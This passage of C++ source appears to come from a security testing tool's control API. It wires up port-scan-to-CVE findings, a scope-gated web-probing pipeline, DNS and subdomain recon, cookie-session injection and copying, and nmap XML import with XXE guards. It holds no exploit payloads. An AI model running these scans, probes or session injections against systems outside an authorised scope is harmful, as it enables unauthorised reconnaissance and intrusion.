        if (bodyJson.contains("includeOpenPorts"))
            opt.includeOpenPorts = bodyJson.value("includeOpenPorts").toBool(true);
        if (bodyJson.contains("correlateCves"))
            opt.correlateCves = bodyJson.value("correlateCves").toBool(true);

        const auto results = m_wiring.portScanner->results();
        const auto bridged = Nullock::Core::ScanBridge::fromPortResults(results, opt);

        // Idempotency: a re-POST (UI double-click, retry, or a re-scan that
        // re-includes the same host) must not duplicate findings. Key on
        // kind+url+summary -- summary carries the CVE id / service label, so
        // two distinct CVEs on the same host:port still both emit, but an
        // identical re-run is a no-op.
        const QChar sep(QChar(0x1f));
        QSet<QString> seen;
        for (const auto &ex : m_wiring.scanner->findings(0))
            seen.insert(ex.kind + sep + ex.url + sep + ex.summary);

        QJsonObject bySev;
        QJsonArray findingsArr;
        int skipped = 0;
        for (const auto &f : bridged) {
            const QString key = f.kind + sep + f.url + sep + f.summary;
            if (seen.contains(key)) { ++skipped; continue; }
            seen.insert(key);
            // rowId 0 -- these don't originate from a captured history row.
            m_wiring.scanner->reportFinding(0, f.severity, f.kind,
                                            f.summary, f.evidence, f.host, f.url);
            bySev[f.severity] = bySev.value(f.severity).toInt() + 1;
            findingsArr.append(QJsonObject{
                { "severity", f.severity },
                { "kind", f.kind },
                { "summary", f.summary },
                { "host", f.host },
                { "url", f.url },
            });
        }

        int openPorts = 0;
        for (const auto &r : results)
            if (r.status.toLower() == QLatin1String("open")) ++openPorts;

        return okJson({
            { "ok", true },
            { "openPorts", openPorts },
            { "emitted", findingsArr.size() },
            { "skippedDuplicates", skipped },
            { "bySeverity", bySev },
            { "findings", findingsArr },
        });
    }

    // ---- recon -> vuln pipeline orchestrator -------------------------
    // POST /api/pipeline/run
    //   { host?, assessWeb?: bool=true, includeOpenPorts?, correlateCves? }
    // The "point at a host, get a report" capstone. Takes the port scanner's
    // current results (optionally filtered to one host), bridges them into
    // network findings (exposed services + banner->CVE), then runs the safe
    // web-identification battery (fingerprint+headers+methods+TLS) against
    // every open HTTP/HTTPS port discovered -- aggregating everything into one
    // report. It probes the discovered web ports, so it is ScopeGuard-gated:
    // each web target is checked against scope and out-of-scope hosts skipped.
    if (path == "/api/pipeline/run") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        if (!m_wiring.scanner)
            return okJson({{ "ok", false }, { "error", "no passive scanner wired" }});

        const QString filterHost = bodyJson.value("host").toString();
        const bool assessWeb = bodyJson.value("assessWeb").toBool(true);

        Nullock::Core::ScanBridge::Options opt;
        if (bodyJson.contains("includeOpenPorts"))
            opt.includeOpenPorts = bodyJson.value("includeOpenPorts").toBool(true);
        if (bodyJson.contains("correlateCves"))
            opt.correlateCves = bodyJson.value("correlateCves").toBool(true);

        // Gather in-scope results (filtered to the requested host if any). The
        // scan was scope-gated at start, but /api/pipeline/run also fires live
        // web probes AND emits findings, so an unfiltered run must not act on
        // hosts the project marks out of scope -- one pre-filter covers both
        // the network-bridge and web-assess layers. (With no scope configured,
        // blocksScope is always false, so this is non-breaking.)
        QList<Nullock::Core::PortResult> results;
        QSet<QString> scopeSkippedHosts;
        for (const auto &r : m_wiring.portScanner->results()) {
            if (!filterHost.isEmpty() && r.host != filterHost) continue;
            if (blocksScope(r.host)) { scopeSkippedHosts.insert(r.host); continue; }
            results.append(r);
        }

        // 1) Network layer: bridge port-scan results -> findings (idempotent).
        const QChar sep(QChar(0x1f));
        QSet<QString> seen;
        for (const auto &ex : m_wiring.scanner->findings(0))
            seen.insert(ex.kind + sep + ex.url + sep + ex.summary);
        QJsonObject bySev;
        int netEmitted = 0;
        for (const auto &f : Nullock::Core::ScanBridge::fromPortResults(results, opt)) {
            const QString key = f.kind + sep + f.url + sep + f.summary;
            if (seen.contains(key)) continue;
            seen.insert(key);
            m_wiring.scanner->reportFinding(0, f.severity, f.kind, f.summary, f.evidence, f.host, f.url);
            bySev[f.severity] = bySev.value(f.severity).toInt() + 1;
            ++netEmitted;
        }

        // 2) Web layer: assess every open HTTP/HTTPS port discovered. Shares
        // the `seen` set so web findings dedup across runs too (and use the
        // same kind+url+title key the snapshot seed above primed).
        QJsonArray webTargets;
        int webFindings = 0, openPorts = 0;
        for (const auto &r : results) {
            if (r.status.toLower() != QLatin1String("open")) continue;
            ++openPorts;
            if (!assessWeb) continue;

            const QString svc = r.service.toLower();
            const quint16 p = r.port;
            bool tls = false, isWeb = false;
            // Explicit TLS signals (any port).
            if (p == 443 || p == 8443 || svc.contains("https") || svc == "ssl"
                || svc == "tls" || svc.contains("ssl/http")) { tls = true; isWeb = true; }
            // Explicit cleartext-HTTP service labels (any port).
            else if (svc == "http" || svc.contains("http-proxy")
                     || svc.contains("http-alt") || svc.contains("www")) { isWeb = true; }
            // Hard HTTP ports we trust by number.
            else if (p == 80 || p == 8080) { isWeb = true; }
            // Soft HTTP ports: only when the service is unknown or http-ish, so
            // we don't fire HTTP probes at a confirmed non-HTTP service.
            else if ((p == 8000 || p == 8888 || p == 8008 || p == 3000 || p == 5000)
                     && (svc.isEmpty() || svc.contains("http"))) { isWeb = true; }
            if (!isWeb) continue;

            const QString scheme = tls ? QStringLiteral("https") : QStringLiteral("http");
            const bool defaultPort = (tls && p == 443) || (!tls && p == 80);
            const QString displayUrl = scheme + "://" + r.host
                + (defaultPort ? QString() : ":" + QString::number(p)) + "/";

            QJsonObject one = assessWebTarget(m_wiring.scanner, r.host, p, tls,
                                              QStringLiteral("/"), QString(), displayUrl, &seen);
            webFindings += one.value("findingCount").toInt();
            const QJsonObject ws = one.value("bySeverity").toObject();
            for (auto it = ws.begin(); it != ws.end(); ++it)
                bySev[it.key()] = bySev.value(it.key()).toInt() + it.value().toInt();
            webTargets.append(one);
        }

        return okJson({
            { "ok", true },
            { "host", filterHost.isEmpty() ? QStringLiteral("(all scanned)") : filterHost },
            { "openPorts", openPorts },
            { "networkFindings", netEmitted },
            { "webTargetsAssessed", webTargets.size() },
            { "webFindings", webFindings },
            { "scopeSkippedHosts", scopeSkippedHosts.size() },
            { "bySeverity", bySev },
            { "webTargets", webTargets },
        });
    }

    // ---- recon engine ------------------------------------------------
    if (path == "/api/recon/dns") {
        if (m_wiring.recon)
            m_wiring.recon->runDns(bodyJson.value("domain").toString());
        return okJson();
    }
    if (path == "/api/recon/crt") {
        if (m_wiring.recon)
            m_wiring.recon->runCertTransparency(bodyJson.value("domain").toString());
        return okJson();
    }
    if (path == "/api/recon/wordlist") {
        if (m_wiring.recon) {
            const QString domain = bodyJson.value("domain").toString();
            QStringList words;
            for (const QJsonValue &v : bodyJson.value("subdomains").toArray()) {
                const QString s = v.toString().trimmed();
                if (!s.isEmpty()) words.append(s);
            }
            m_wiring.recon->runSubdomainWordlist(domain, words);
        }
        return okJson();
    }
    if (path == "/api/recon/stop") {
        if (m_wiring.recon) m_wiring.recon->stop();
        return okJson();
    }
    if (path == "/api/recon/clear") {
        if (m_wiring.recon) m_wiring.recon->clear();
        return okJson();
    }

    // ---- sessions (cookie jar) ---------------------------------------
    if (path == "/api/sessions/autoInject") {
        bool ok = m_wiring.sessions
               && m_wiring.sessions->setAutoInject(bodyJson.value("host").toString(),
                                                    bodyJson.value("on").toBool());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/sessions/clear") {
        if (!m_wiring.sessions) return okJson({{ "ok", false }});
        const QString host = bodyJson.value("host").toString();
        if (host.isEmpty()) m_wiring.sessions->clearAll();
        else                m_wiring.sessions->clearHost(host);
        return okJson();
    }
    if (path == "/api/sessions/copyTo") {
        bool ok = m_wiring.sessions
               && m_wiring.sessions->copyTo(bodyJson.value("from").toString(),
                                             bodyJson.value("to").toString());
        return okJson({{ "ok", ok }});
    }
    // POST /api/portscan/import-nmap  body: raw nmap XML
    // Pulls <host>/<ports>/<port>/<state>/<service> into PortResult.
    if (path == "/api/portscan/import-nmap") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        // XXE / billion-laughs defence. Qt's QXmlStreamReader doesn't
        // expand external entities by default, but it does report
        // <!ENTITY> declarations and entity references as tokens, and
        // historical Qt CVEs (CVE-2015-1858) covered exactly this kind
        // of recursive entity bomb. Rejecting any DTD/ENTITY in the body
        // up front means a future Qt change (or a parser swap) can't
        // re-open the hole. We also cap element nesting depth at 64 so
        // a hand-crafted-deep XML can't blow the recursion budget.
        const QByteArray needleD = QByteArrayLiteral("<!DOCTYPE");
        const QByteArray needleE = QByteArrayLiteral("<!ENTITY");
        const QByteArray bodyHead = body.left(64 * 1024);
        if (bodyHead.contains(needleD) || bodyHead.contains(needleE)) {
            return okJson({{ "ok", false }, { "error",
                "nmap XML import refuses input containing DTD or ENTITY declarations" }});
        }
        QXmlStreamReader xml(body);
        int depth = 0;
        QString currentHost;
        QString currentAddr;
        QList<Nullock::Core::PortResult> imported;
        while (!xml.atEnd()) {
            xml.readNext();
            if (xml.isStartElement()) {
                if (++depth > 64) {
                    return okJson({{ "ok", false }, { "error",
                        "nmap XML import: element nesting depth exceeded" }});
                }
                const QString name = xml.name().toString();
                if (name == "host") {
                    currentHost.clear();
                    currentAddr.clear();
                } else if (name == "address") {
                    currentAddr = xml.attributes().value("addr").toString();
                } else if (name == "hostname") {
                    currentHost = xml.attributes().value("name").toString();
                } else if (name == "port") {
                    Nullock::Core::PortResult r;
                    r.host = !currentHost.isEmpty() ? currentHost : currentAddr;
                    r.port = static_cast<quint16>(xml.attributes().value("portid").toInt());
                    while (!xml.atEnd()) {
                        xml.readNext();
                        if (xml.isStartElement() && xml.name() == QLatin1String("state")) {
                            r.status = xml.attributes().value("state").toString();
                        } else if (xml.isStartElement() && xml.name() == QLatin1String("service")) {
                            r.service = xml.attributes().value("name").toString();
                            r.banner  = xml.attributes().value("banner").toString();
                        } else if (xml.isEndElement() && xml.name() == QLatin1String("port")) {
                            break;
                        }
                    }
                    if (r.port > 0) imported.append(r);
                }
            } else if (xml.isEndElement()) {
                if (depth > 0) --depth;
            }
        }
        if (xml.hasError())
            return okJson({{ "ok", false }, { "error", xml.errorString() } });
        // Group display host: just the first one found, or "N hosts"
        // when imported from a multi-host nmap run.
        QSet<QString> distinctHosts;
        for (const auto &r : imported) distinctHosts.insert(r.host);
        const QString displayHost = distinctHosts.size() == 1
            ? *distinctHosts.cbegin()
            : QString("%1 hosts").arg(distinctHosts.size());
        const bool ok = m_wiring.portScanner->setResults(displayHost, imported);
        return okJson({
            { "ok",       ok },
            { "imported", imported.size() },
        });
    }

    // ---- project management ------------------------------------------
    if (path == "/api/project/list") {
        if (!m_wiring.projectStore) return httpJson(200, QJsonObject{});
        QJsonArray names;
        for (const QString &n : m_wiring.projectStore->listProjects())
            names.append(n);
        return httpJson(200, QJsonObject{
            { "root",     m_wiring.projectStore->projectsRoot() },
            { "current",  m_wiring.projectStore->metadata().name },
            { "projects", names },
        });
    }
    if (path == "/api/project/open") {
        bool ok = m_wiring.projectStore
               && m_wiring.projectStore->openByName(bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/project/create") {
        bool ok = m_wiring.projectStore
               && m_wiring.projectStore->createProject(bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }

    (void)method;
    return httpResponse(404, "text/plain", "Not found: " + path.toUtf8());
}

} // namespace Nullock::Control
